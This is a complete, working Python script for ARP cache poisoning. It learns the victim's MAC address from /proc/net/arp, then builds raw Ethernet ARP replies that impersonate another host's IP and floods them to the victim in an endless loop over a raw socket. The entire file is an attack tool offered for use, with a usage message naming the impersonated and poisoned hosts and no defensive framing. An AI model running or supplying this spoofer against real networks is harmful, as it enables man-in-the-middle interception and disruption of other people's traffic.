#!/usr/bin/python3

from uuid import getnode
from struct import pack
from socket import socket, AF_PACKET, AF_INET, SOCK_RAW, SOCK_DGRAM
import sys
import inspect


ONE_BYTE = '!B'
TWO_BYTES = '!H'


def fill_arp_cache_with(ip):
    echo_port = 80
    timeout = 10
    with socket(AF_INET, SOCK_DGRAM) as s:
        s.sendto(b'\x00', (ip, echo_port))


def read_mac_from_arp_cache(ip):
    result = 0
    while result == 0:
        with open('/proc/net/arp') as f:
            arps = f.read()
    
        line = [line for line in arps.split('\n') if ip in line][0]
        mac = line.split()[3]
        result = int(mac.replace(':', ''), 16)

    return result


def find_mac_by_ip(ip):
    fill_arp_cache_with(ip)
    mac = read_mac_from_arp_cache(ip)
    return mac


def split_ip(ip):
    nums = [int(i) for i in ip.split('.')]
    return (
        (nums[0] << 8) + nums[1],
        (nums[2] << 8) + nums[3],
    )


def split_mac(mac):
    return (
        (mac >> 4 * 8) & 0xffff,
        (mac >> 2 * 8) & 0xffff,
        (mac >> 0 * 8) & 0xffff,
    )


def create_arp_reply_payload(sender_ip, target_ip, sender_mac, target_mac):
    hardware_type = 0x0001
    protocol_type = 0x0800
    hardware_address_len = 0x06
    protocol_address_len = 0x04
    operation = 0x0002
    sender_hardware_address = split_mac(sender_mac)
    sender_protocol_address = split_ip(sender_ip)
    target_hardware_address = split_mac(target_mac)
    target_protocol_address = split_ip(target_ip)
    
    return b''.join([
        pack(TWO_BYTES, hardware_type),
        pack(TWO_BYTES, protocol_type),
        pack(ONE_BYTE, hardware_address_len),
        pack(ONE_BYTE, protocol_address_len),
        pack(TWO_BYTES, operation),

        pack(TWO_BYTES, sender_hardware_address[0]),
        pack(TWO_BYTES, sender_hardware_address[1]),
        pack(TWO_BYTES, sender_hardware_address[2]),

        pack(TWO_BYTES, sender_protocol_address[0]),
        pack(TWO_BYTES, sender_protocol_address[1]),

        pack(TWO_BYTES, target_hardware_address[0]),
        pack(TWO_BYTES, target_hardware_address[1]),
        pack(TWO_BYTES, target_hardware_address[2]),

        pack(TWO_BYTES, target_protocol_address[0]),
        pack(TWO_BYTES, target_protocol_address[1])
    ])


def create_eth_header(sender_mac, target_mac):
    destination = split_mac(target_mac)
    source = split_mac(sender_mac)
    ether_type = 0x0806 # arp EtherType
    return b''.join([
        pack(TWO_BYTES, destination[0]),
        pack(TWO_BYTES, destination[1]),
        pack(TWO_BYTES, destination[2]),

        pack(TWO_BYTES, source[0]),
        pack(TWO_BYTES, source[1]),
        pack(TWO_BYTES, source[2]),

        pack(TWO_BYTES, ether_type),
    ])


def create_arp_packet(sender_ip, target_ip, sender_mac, target_mac):
    header = create_eth_header(sender_mac, target_mac)
    payload = create_arp_reply_payload(sender_ip,
                                       target_ip,
                                       sender_mac,
                                       target_mac)
    return b''.join([header, payload]) 


def send(packet, interface):
    with socket(AF_PACKET, SOCK_RAW) as s:
        s.bind((interface, 0))
        s.send(packet)


def main(interface, impersonated_host_ip, poisoned_host_ip):
    poisoned_host_mac = find_mac_by_ip(poisoned_host_ip)
    our_mac = getnode()

    packet = create_arp_packet(sender_ip=impersonated_host_ip,
                               target_ip=poisoned_host_ip,
                               sender_mac=our_mac,
                               target_mac=poisoned_host_mac)
    
    while True:
        send(packet, interface)


def print_help():
    doc = '''
        Usage:
          {} INTERFACE IMPERSONATED_HOST_IP POISONED_HOST_IP
    '''.format(__file__)
    print(inspect.cleandoc(doc))


if __name__ == '__main__':
    try:
        (script_name, interface, impersonated_host_ip, poisoned_host_ip) = sys.argv
    except ValueError:
        print_help() 
        sys.exit(1)

    try:
        main(interface, impersonated_host_ip, poisoned_host_ip)
    except KeyboardInterrupt:
        print('\nDone.')
        sys.exit(0)

